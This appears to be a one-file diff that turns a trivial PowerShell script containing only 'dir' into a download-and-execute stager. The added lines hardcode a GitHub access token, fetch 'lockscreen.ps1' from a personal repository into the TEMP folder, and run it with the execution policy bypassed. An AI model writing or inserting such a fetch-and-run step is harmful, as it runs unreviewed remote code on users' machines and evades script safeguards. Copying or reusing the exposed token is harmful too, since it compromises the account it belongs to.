@@ -1,1 +1,5 @@
-dir
+
+$token = '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'
+$headers = @{ Authorization = "token $token" }
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Olivia200-cyber/Olivia/main/lockscreen.ps1' -Headers $headers -OutFile $env:TEMP\lockscreen.ps1
+powershell -ExecutionPolicy Bypass -File $env:TEMP\lockscreen.ps1
